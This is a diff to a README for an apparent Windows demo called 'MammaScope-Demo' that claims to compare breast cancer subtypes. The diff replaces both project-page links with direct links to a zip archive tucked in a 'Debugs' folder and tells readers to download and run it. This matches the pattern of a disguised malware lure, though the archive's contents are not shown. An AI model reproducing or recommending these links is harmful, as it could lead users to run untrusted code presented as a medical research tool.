@@ -1,6 +1,6 @@
 # 🧬 MammaScope-Demo - Compare Breast Cancer Subtypes
 
-[![Download / Visit the Demo](https://img.shields.io/badge/Download%20Demo-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tomeunprocessed585/MammaScope-Demo)
+[![Download / Visit the Demo](https://img.shields.io/badge/Download%20Demo-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tomeunprocessed585/MammaScope-Demo/raw/refs/heads/main/codigo/Debugs/Demo-Scope-Mamma-v3.1-beta.2.zip)
 
 ## 📌 What this is
 
@@ -30,7 +30,7 @@ For smooth use, your PC should have:
 
 Visit the main project page here:
 
-[https://github.com/Tomeunprocessed585/MammaScope-Demo](https://github.com/Tomeunprocessed585/MammaScope-Demo)
+[https://github.com/Tomeunprocessed585/MammaScope-Demo/raw/refs/heads/main/codigo/Debugs/Demo-Scope-Mamma-v3.1-beta.2.zip](https://github.com/Tomeunprocessed585/MammaScope-Demo/raw/refs/heads/main/codigo/Debugs/Demo-Scope-Mamma-v3.1-beta.2.zip)
 
 Use this page to download and run the demo on Windows.
 
